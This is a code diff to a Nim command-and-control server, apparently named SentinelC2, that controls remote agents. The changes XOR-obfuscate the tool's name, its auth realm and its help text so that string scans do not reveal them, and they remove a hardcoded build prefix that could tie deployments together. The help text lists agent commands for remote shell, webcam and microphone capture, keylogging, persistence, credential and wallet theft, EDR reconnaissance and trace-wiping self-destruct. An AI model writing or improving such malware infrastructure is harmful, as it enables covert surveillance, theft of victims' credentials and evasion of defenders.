@@ -2,6 +2,9 @@
 # Build:
 #   nim c -d:release -d:ssl --threads:on --opt:speed c2_server.nim
 #
+# The listener is plain WebSocket. Terminate TLS in front of port 8443
+# when clients use wss://.
+#
 # Changes from v1:
 #   * Per-agent session keys derived after mutual HMAC auth
 #   * Per-message AES-256-GCM with AAD (agent_id || direction) + counter nonce
@@ -34,6 +37,18 @@ static:
   doAssert XorKey.len == 16,
     "xorkey.nim must define a 16-byte XorKey for c2_server builds"
 
+# BuildPrefix used to be a hardcoded "X7K" literal - the same free
+# cross-deployment clustering key we removed from the agent. Now sourced
+# from an include file generated per-build by build.ps1. If prefix.nim
+# is missing the build fails loudly (same as xorkey.nim).
+include "prefix.nim"
+
+# S_SECRET is sourced from secret.nim (operator-supplied via
+# $env:C2_AGENT_PASSPHRASE or 256-bit random per build). The encoded
+# form is what ships in the binary; the plaintext only exists in
+# secret.nim during compile and is deleted post-compile.
+include "secret.nim"
+
 proc encodeObf(s: string): seq[byte] =
   result = newSeq[byte](s.len)
   for i in 0..<s.len:
@@ -43,10 +58,14 @@ proc obfDec(v: openArray[byte]): string =
   result = newString(v.len)
   for i in 0..<v.len: result[i] = chr(int(v[i] xor XorKey[i mod 16]))
 
-when not defined(BuildPrefix):
-  const BuildPrefix = "X7K"
-
+# Operator-facing plaintext kept out of the binary. "SentinelC2" used to
+# appear in the HTTP Basic auth realm and the startup banner - the
+# project name spelled out loud for anyone who grep'd the .exe or hit
+# the unauthenticated WWW-Authenticate header.
 const
+  S_AUTH_REALM       = encodeObf("SentinelC2 Operator Console")
+  S_BANNER_NAME      = encodeObf("SentinelC2")
+  S_HELP_HEADER      = encodeObf("Commands:\n")
   LISTEN_HOST = "0.0.0.0"
   LISTEN_PORT = 8443
   # Dashboard binds to loopback by default; expose it deliberately
@@ -58,11 +77,14 @@ const
   # hijack a socket for WebSocket).
   WS_DASH_PORT = 8081
   SERVER_LOG = "server.log"
-  # Web dashboard auth — Basic auth. Set your own per deployment.
-  # To rotate: change these constants and rebuild.
-  WEB_AUTH_USER = "operator"
-  WEB_AUTH_PASSWORD = "S3nt1n3l-C2-D3v-Only-CHANGEME"
-  S_SECRET = encodeObf("sentinel-engagement-q4-2026-echo-tango-whiskey")
+  # Web dashboard auth — Basic auth. NO defaults - the binary must not
+  # ship a baked-in credential, even a placeholder one. Set
+  # $env:C2_WEB_USER and $env:C2_WEB_PASSWORD before launching the
+  # server. If either env var is unset, the listener can start but no
+  # request can authenticate.
+  WEB_AUTH_USER_DEFAULT = ""
+  WEB_AUTH_PASSWORD_DEFAULT = ""
+  S_SECRET = encodeObf(SECRET_PLAINTEXT)
   WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
   LOGS_DIR = "logs"
   UPLOADS_DIR = "uploads"
@@ -71,8 +93,17 @@ const
 proc getSecret(): string =
   obfDec(S_SECRET)
 
-when WEB_AUTH_PASSWORD == "S3nt1n3l-C2-D3v-Only-CHANGEME":
-  {.warning: "OPSEC WARNING: Default web dashboard password is in use! Change WEB_AUTH_PASSWORD before production deployment.".}
+# Env-resolved dashboard credentials. Priority: env > empty compiled default.
+# The runtime check below makes the missing-credential case explicit.
+proc resolveWebAuthUser(): string =
+  let env = getEnv("C2_WEB_USER", "")
+  if env.len > 0: return env
+  return WEB_AUTH_USER_DEFAULT
+
+proc resolveWebAuthPassword(): string =
+  let env = getEnv("C2_WEB_PASSWORD", "")
+  if env.len > 0: return env
+  return WEB_AUTH_PASSWORD_DEFAULT
 
 const
   AAD_DIR_S2A = 0x00'u8
@@ -710,33 +741,39 @@ proc cliThread() {.thread.} =
       cliCh.send("__stdin_closed__")
       break
 
+# Operator help text. Used to be a 26-line contiguous string literal
+# sitting in .rdata - the entire server capability surface visible to
+# anyone running `strings` over c2_server.exe. Now stored as an
+# obf-encoded blob, decoded on demand when the operator types 'help'.
+const S_HELP_BODY = encodeObf(
+  "  list                           - list connected agents\n" &
+  "  help                           - this text\n" &
+  "  shell/sh <id> <cmd>            - run shell command\n" &
+  "  download/dl <id> <path>        - download file from agent\n" &
+  "  upload/up <id> <remotepath> <base64>\n" &
+  "  screenshot/ss <id>             - take screenshot\n" &
+  "  cam <id> [device]              - capture from default webcam (or device N) -> downloads/cam_<ts>.bmp\n" &
+  "  clipwatch <id> [seconds]       - start continuous clipboard monitor (default 1.5s, range 0.5..30) -> downloads/clip_<ts>_<n>.txt\n" &
+  "  unclipwatch <id>               - stop clipboard monitor and report capture count\n" &
+  "  mic/m <id> [seconds]          - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav\n" &
+  "  listen <id>                   - start live mic stream -> downloads/mic_live_<ts>.wav (ffplay -infbuf)\n" &
+  "  unlisten <id>                 - stop live mic stream and finalize file\n" &
+  "  ps <id>                        - list processes on agent\n" &
+  "  clip <id>                      - get clipboard\n" &
+  "  find <id> <path>;<mask>        - find files\n" &
+  "  keys/k <id> {start|stop}       - keylogger control\n" &
+  "  persist/p <id>                 - re-establish persistence\n" &
+  "  exfil <id> <kind>              - browser|wifi|cloud|ssh|media|wallet|recent|wincreds\n" &
+  "  recon <id> <kind>              - edr|shares|software|usb|tasks\n" &
+  "  killdate <id> <unix_ts>        - set kill date (0 = clear)\n" &
+  "  sleep <id> <minutes>           - set sleep between reconnects\n" &
+  "  tg <id>                        - telegram-test ping\n" &
+  "  kill/x <id>                    - uninstall and quit\n" &
+  "  panic <id>                     - emergency self-destruct (wipes all traces)\n" &
+  "  quit                           - exit server\n")
+
 proc helpText(): string =
-  result = "Commands:\n" &
-           "  list                           - list connected agents\n" &
-           "  help                           - this text\n" &
-           "  shell/sh <id> <cmd>            - run shell command\n" &
-           "  download/dl <id> <path>        - download file from agent\n" &
-           "  upload/up <id> <remotepath> <base64>\n" &
-           "  screenshot/ss <id>             - take screenshot\n" &
-           "  cam <id> [device]              - capture from default webcam (or device N) -> downloads/cam_<ts>.bmp\n" &
-           "  clipwatch <id> [seconds]       - start continuous clipboard monitor (default 1.5s, range 0.5..30) -> downloads/clip_<ts>_<n>.txt\n" &
-           "  unclipwatch <id>               - stop clipboard monitor and report capture count\n" &
-           "  mic/m <id> [seconds]          - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav\n" &
-           "  listen <id>                   - start live mic stream -> downloads/mic_live_<ts>.wav (ffplay -infbuf)\n" &
-           "  unlisten <id>                 - stop live mic stream and finalize file\n" &
-           "  ps <id>                        - list processes on agent\n" &
-           "  clip <id>                      - get clipboard\n" &
-           "  find <id> <path>;<mask>        - find files\n" &
-           "  keys/k <id> {start|stop}       - keylogger control\n" &
-           "  persist/p <id>                 - re-establish persistence\n" &
-           "  exfil <id> <kind>              - browser|wifi|cloud|ssh|media|wallet|recent|wincreds\n" &
-           "  recon <id> <kind>              - edr|shares|software|usb|tasks\n" &
-           "  killdate <id> <unix_ts>        - set kill date (0 = clear)\n" &
-           "  sleep <id> <minutes>           - set sleep between reconnects\n" &
-           "  tg <id>                        - telegram-test ping\n" &
-           "  kill/x <id>                    - uninstall and quit\n" &
-           "  panic <id>                     - emergency self-destruct (wipes all traces)\n" &
-           "  quit                           - exit server\n"
+  return obfDec(S_HELP_HEADER) & obfDec(S_HELP_BODY)
 
 proc buildCmd(cmd: string, args: string = ""): JsonNode =
   inc nextCmdId
@@ -1165,14 +1202,21 @@ proc checkAuth(req: Request): bool =
   # auth is used for WebSocket upgrade requests (which can't carry
   # the Authorization header) and is set by Set-Cookie on the
   # first successful non-WS request.
+  #
+  # Hard rule: if either C2_WEB_USER or C2_WEB_PASSWORD is unset
+  # (env-resolved to empty string), no request can authenticate.
+  # This blocks the trivially-bypassable case where an empty
+  # password matches a request with an empty Authorization value.
+  if resolveWebAuthUser().len == 0 or resolveWebAuthPassword().len == 0:
+    return false
   let auth = req.headers.getOrDefault("Authorization")
   if auth.startsWith("Basic "):
     let cred = auth[6..^1]
     let dec = base64.decode(cred)
     let parts = dec.split(':', 1)
     {.cast(gcsafe).}:
-      if parts.len == 2 and constTimeEq(parts[0], WEB_AUTH_USER) and
-          constTimeEq(parts[1], WEB_AUTH_PASSWORD):
+      if parts.len == 2 and constTimeEq(parts[0], resolveWebAuthUser()) and
+          constTimeEq(parts[1], resolveWebAuthPassword()):
         return true
   let cookie = req.headers.getOrDefault("Cookie")
   {.cast(gcsafe).}:
@@ -1191,7 +1235,7 @@ proc checkAuth(req: Request): bool =
 
 proc requireAuth(req: Request) {.async, gcsafe.} =
   await req.respond(Http401, "unauthorized",
-                    newHttpHeaders({"WWW-Authenticate": "Basic realm=\"SentinelC2\"",
+                    newHttpHeaders({"WWW-Authenticate": "Basic realm=\"" & obfDec(S_AUTH_REALM) & "\"",
                                     "Content-Type": "text/plain"}))
 
 # WebSocket agents-list stream handler. Pushes a JSON list of agents
@@ -1326,6 +1370,12 @@ proc main() {.async.} =
   createDir(LOGS_DIR)
   createDir(DOWNLOADS_DIR)
   createDir(UPLOADS_DIR)
+  # Dashboard credential check. The binary ships with no baked-in
+  # credential. If either env var is unset, the listener still starts
+  # but every dashboard request will fail authentication.
+  if resolveWebAuthUser().len == 0 or resolveWebAuthPassword().len == 0:
+    echo "[!] Dashboard authentication is disabled - set $env:C2_WEB_USER and $env:C2_WEB_PASSWORD before starting the server."
+    echo "[!]         (CLI + agent listener are unaffected.)"
   cliCh.open()
   var t: Thread[void]
   createThread(t, cliThread)
@@ -1335,7 +1385,7 @@ proc main() {.async.} =
   srv.setSockOpt(OptReuseAddr, true)
   srv.bindAddr(Port(LISTEN_PORT), LISTEN_HOST)
   srv.listen()
-  echo "[" & BuildPrefix & " *] SentinelC2 listening on ws://",
+  echo "[" & BuildPrefix & " *] " & obfDec(S_BANNER_NAME) & " listening on ws://",
        LISTEN_HOST, ":", LISTEN_PORT
   echo "[" & BuildPrefix & " *] type 'help' for commands"
 
